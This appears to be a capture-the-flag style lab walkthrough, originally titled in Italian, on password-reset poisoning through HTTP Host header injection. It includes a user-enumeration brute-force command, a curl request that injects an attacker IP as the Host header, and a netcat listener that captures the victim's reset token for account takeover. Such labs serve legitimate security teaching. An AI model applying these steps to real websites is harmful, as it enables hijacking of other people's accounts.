# Documentazione

# Goal

The aim of the lab is to exploit the misconfiguration of some web servers that allow an attacker to send a valid reset password email containing a malicious link.

# Readme

The lab is divided into three phases:

1. User Discovery
    
    In this phase you will have to discover a valid user registered to the web server in order to start the recover password procedure using that account.
    
2. Header Injection
    
    You will intercept and edit the recover password request in order to inject the attacker URL; doing so will allow you to send a poisonous email to the victim and if the victim will click on the reset password link you will obtain the unique token identifying the user to reset the password.
    
3. Password Reset
    
    With token you get from the previous step you will be able to change the password of the victim account and gain access to it.
    

If you want to try to solve the lab by yourself there you got some useful informations:

- You can open a virtual browser on the attacker container by reaching [`http://localhost:3000`](http://localhost:3000)
- You can open a shell on the attacker container
- The web server is available at [`http://webserver`](http://webserver) and is only accessible within the intranet, you can use the attacker browser to reach it
- The victim mail client is available at [`http://victim_mail`](http://victim_mail) and is only accessible within the intranet, you can use the attacker browser to reach it

# Solution

The solution will follow the phases described in the documentation.

### User Discovery

This phase consist in discovering a valid user registered to the web server in order to start the recover password procedure using that account.

Using the web server app that is accessible at `http://webserver` you may notice that if you try to login inserting a non existing user, the server will show you an error message saying: “The inserted email do not exist”.

You can use that vulnerability to find a valid user registered to the web server.

The approach that will be used is bruteforcing with a dictionary obtained by sending a lot of POST request with different user email versus the server until you found a valid email. 

You can accomplish this by using a simple python script; luckily for you we already provide a script for doing so, connect with a shell to the attacker machine and reach the `/tools` folder

```bash
cd /tools
```

In it you will find two files:

- `email_dictionary`: a basic dictionary that will save you hours and hours
- `find_email.py`: the script

You can have a detailed look of what the script do and require using:

```bash
python3 find_email.py --help
```

![Tutorial_1.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_1.png?raw=true)

Follow the command to discover a valid user in the lab:

```bash
python3 find_email.py \
--url http://webserver \
--form email \
--message "The inserted email do not exist" \
--dictionary email_dictionary
```

The above command return the `admin123@victimmail.it` email address that we will use as victim.

![Tutorial_2.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_2.png?raw=true)

### Header Injection

In the second phase you will use a web server misconfiguration that allow an attacker to change the “host” parameter contained in header options. The web server during the reset password procedure, will create a link getting the domain from the host field presented in the POST request; normally this field report the server domain (http://webserver) but if an attacker send a post request with a modified host parameter (and the web server do not implement the proper checks) he can send authentic reset email with an arbitrary reset password link.

In order to start the attack you will first need to intercept and block the reset password request;  in order to do that, connect on your browser to [`http://localhost:3000`](http://attacker:3000) to display the attacker container browser. Now with attacker’s browser visit reset password page (navigate to `http://webserver` and press on “Forgot Password”); right clicking wherever in the reset password page will open you a window; select the “Inspect (Q)” and navigate to the “Network“ tab in order to look at all the requests sent from the browser (you may need to refresh the page).

![Tutorial_3.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_3.png?raw=true)

An important tool that firefox browser gives you is the “Block URL” functionality that ask you to specify an IP address to block all requests coming from and to the specified IP allowing you to view and edit all of them. Just insert [`http://webserver`](http://webserver) URL and enable the blocking option:

![Tutorial_4.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_4.png?raw=true)

Now you’re almost ready to launch the attack, in the UI of the page fill the email address with the one that you have obtained in the first phase and click send button.

Firefox will block the sent request and will give you the possibility to copy the query as cURL  (right click on it → Copy Value → Copy as cURL).

![Tutorial_5.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_5.png?raw=true)

Now using a text editor of you choice edit the copied cURL text as follow. 

You need to add a header host filed; you can add any header row by using the `-H` option so in order to inject the malicious host you need to add `-H 'Host: 192.168.1.13:12345'` to the request. The full modified cURL request is then:

```bash
curl -H 'Host: 192.168.1.13:12345' \
'http://webserver/resetpassword?' \
-X POST \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-raw 'email=admin123@victimmail.it'
```

<aside>
💡 Note that there could be more header option in the original post request, those are not strictly necessary and has been removed in the provided modified cURL.

</aside>

Executing the above command will send a reset mail sent from web server to the admin123@victimmail.it victim email; in the email there will be a malicious link within the reset password button.

Lastly, you have added the “Host:” parameter inserting attackers IP and a custom `12345` port, but in order to receive the token, you need to launch netcat listening on the specified `12345` port using the following in an attacker shell:

```bash
nc -lvnp 12345
```

![Tutorial_6.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_6.png?raw=true)

### Password Reset

You are now going to impersonate the victim that open webmail and click on the reset password link, to do that, open the victim webmail directly from the attacker browser (of course this makes no sense at all but makes the lab easy to use) at `http://victim_mail` 

In the victim mail you will be able to see all the email sent from the web server, if you correctly execute the above phases you should be able to see an email and open it:

![Tutorial_7.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_7.png?raw=true)

As you can see in the mail there is a button with a link, press that button.

Coming back to the attacker shell where you launch netcat you will see the following:

![Tutorial_8.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_8.png?raw=true)

You successfully hijack the reset password request to your machine instead of sending it to the web server; as you can see you obtained the token that allow the web server to identify the user that is requesting the password reset; you can now use it to make the web server believe that you are the victim; just copy the entire URL you see in the request and paste it in the web browser;

![Tutorial_9.png](https://github.com/marcotammaro/HTTP_Header_Injection/blob/main/images//Tutorial_9.png?raw=true)

Press enter and the web server will allow you to set a new password for the admin123 account.

Note: in order to be able to paste the url in the attacker container browser you may need to use the KASM VNC clipboard utility that is showed as a panel on the left side of the attacker browser.

Create than a password and use it to login with the admin123@victimmail.it email to see if the attack has been successful.

You got it! Victim has been hacked!